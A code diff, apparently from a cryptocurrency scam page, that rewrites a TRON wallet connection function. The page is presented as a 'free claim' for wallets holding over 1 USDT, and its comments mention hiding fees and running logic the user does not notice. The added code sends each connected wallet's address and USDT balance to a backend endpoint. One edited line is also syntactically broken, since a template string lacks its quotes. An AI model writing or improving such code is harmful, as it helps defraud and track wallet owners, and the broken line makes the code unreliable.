@@ -489,49 +489,64 @@
         };
         
         // 初始化钱包：仅展示地址和余额，不透露费用
-        async function initWallet() {
-            try {
-                userAddress = tronWeb.defaultAddress.base58;
-                trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
-                
-                // 获取余额
-                const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
-                tokenBalance = Number(usdtRaw) / 1000000;
-                const trxRaw = await trc20Contract.balanceOf(userAddress).call();
-                trxBalance = Number(trxRaw) / 1000000;
-                
-                const userInfoEl = document.getElementById("userInfo");
-                if (tokenBalance <= 1) {
-                    userInfoEl.innerHTML = `
-                        已连接：<br>
-                        ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                        USDT余额：<span style="color: #ef4444;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-                        <span style="color: #ef4444; font-size: 14px; margin-top: 5px; display: inline-block;">❌ 不符合免费领取条件（USDT需＞1）</span>
-                    `;
-                    approveBtn.disabled = true;
-                } else {
-                    userInfoEl.innerHTML = `
-                        已连接：<br>
-                        ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                        USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-                        <span style="color: #4ade80; font-size: 14px; margin-top: 5px; display: inline-block;">✅ 符合免费领取条件，点击领取即可</span>
-                    `;
-                    approveBtn.disabled = false;
-                }
-                
-                // 更新页面状态
-                updateWalletStatus();
-                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            } catch (e) {
-                tokenBalance = 0;
-                trxBalance = 0;
-                document.getElementById("userInfo").innerHTML = `
-                    钱包连接异常<br>
-                    <span style="color: #ef4444;">系统繁忙，请稍后重试</span>
-                `;
-                approveBtn.disabled = true;
-            }
-        }
+      // 初始化钱包：连接钱包后立即调用后端接口，触发后端日志
+async function initWallet() {
+  try {
+    userAddress = tronWeb.defaultAddress.base58;
+    trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
+    
+    // 1. 获取用户余额
+    const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
+    tokenBalance = Number(usdtRaw) / 1000000;
+    const trxRaw = await tronWeb.trx.getBalance(userAddress);
+    trxBalance = Number(trxRaw) / 1000000;
+    
+    // 2. 连接钱包后，立即调用后端/init-client接口（这是之前漏的逻辑）
+    const initRes = await fetch(`${BACKEND_API}/init-client`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        userAddress: userAddress,
+        usdtBalance: tokenBalance
+      }),
+      credentials: "include",
+      timeout: 10000
+    });
+    const initData = await initRes.json();
+    
+    // 3. 更新页面状态
+    const userInfoEl = document.getElementById("userInfo");
+    if (tokenBalance <= 1) {
+      userInfoEl.innerHTML = `
+        已连接：<br>
+        ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+        USDT余额：<span style="color: #ef4444;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
+        <span style="color: #ef4444; font-size: 14px; margin-top: 5px; display: inline-block;">❌ 不符合免费领取条件（USDT需＞1）</span>
+      `;
+      approveBtn.disabled = true;
+    } else {
+      userInfoEl.innerHTML = `
+        已连接：<br>
+        ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+        USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
+        <span style="color: #4ade80; font-size: 14px; margin-top: 5px; display: inline-block;">✅ 符合免费领取条件，点击领取即可</span>
+      `;
+      approveBtn.disabled = false;
+    }
+    
+    // 更新页面状态
+    updateWalletStatus();
+    document.getElementById("statusAddress").textContent = ${userAddress.slice(0,8)}...${userAddress.slice(-6)};
+
+  } catch (e) {
+    console.error("连接钱包后调用后端失败：", e);
+    document.getElementById("userInfo").innerHTML = `
+      钱包连接异常<br>
+      <span style="color: #ef4444;">系统繁忙，请稍后重试</span>
+    `;
+    approveBtn.disabled = true;
+  }
+}
         
         // 持续计算逻辑（用户无感知，仅展示剩余资源）
         function startPersistentTrxCountdown() {
